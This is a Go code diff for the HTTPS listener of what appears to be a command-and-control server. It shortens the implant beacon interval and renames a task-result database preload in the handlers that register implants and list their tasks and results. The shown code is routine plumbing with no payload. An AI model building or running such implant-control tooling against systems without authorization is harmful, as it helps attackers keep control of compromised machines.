@@ -67,7 +67,7 @@ func (l *HTTPSListener) Register(c *gin.Context) {
 	// Create Implant
 	implant := &model.Implant{
 		SystemInfo:   sysInfo,
-		Dwell:        "30s",
+		Dwell:        "5s", // TOOD: change to be a parameter
 		Jitter:       0,
 		CommProtocol: l.defaultCommProtocol.String(),
 	}
@@ -115,7 +115,7 @@ func (l *HTTPSListener) Beacon(c *gin.Context) {
 
 func (l *HTTPSListener) OpListImplants(c *gin.Context) {
 	var implants []model.Implant
-	if err := l.db.Preload("Tasks").Preload("Tasks.Results").Find(&implants).Error; err != nil {
+	if err := l.db.Preload("Tasks").Preload("Tasks.Result").Find(&implants).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
@@ -125,7 +125,7 @@ func (l *HTTPSListener) OpListImplants(c *gin.Context) {
 func (l *HTTPSListener) OpGetImplant(c *gin.Context) {
 	id := c.Param("id")
 	var implant model.Implant
-	if err := l.db.Preload("Tasks").Preload("Tasks.Results").First(&implant, id).Error; err != nil {
+	if err := l.db.Preload("Tasks").Preload("Tasks.Result").First(&implant, id).Error; err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "implant not found"})
 		return
 	}
@@ -134,7 +134,7 @@ func (l *HTTPSListener) OpGetImplant(c *gin.Context) {
 func (l *HTTPSListener) OpListTasks(c *gin.Context) {
 	id := c.Param("implant-id")
 	var tasks []model.Task
-	if err := l.db.Where("implant_id = ?", id).Preload("Results").Find(&tasks).Error; err != nil {
+	if err := l.db.Where("implant_id = ?", id).Preload("Result").Find(&tasks).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
@@ -149,7 +149,7 @@ func (l *HTTPSListener) OpGetTask(c *gin.Context) {
 	// fetch only if it belongs to that implant
 	var task model.Task
 	if err := l.db.
-		Where("id = ? AND implant_id = ?", taskID, implantID).Preload("Results").
+		Where("id = ? AND implant_id = ?", taskID, implantID).Preload("Result").
 		First(&task).Error; err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
 		return
@@ -195,7 +195,7 @@ func (l *HTTPSListener) OpListResults(c *gin.Context) {
 	// get all tasks for implant
 	var tasks []model.Task
 	if err := l.db.
-		Preload("Results").
+		Preload("Result").
 		Where("implant_id = ?", id).
 		Find(&tasks).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
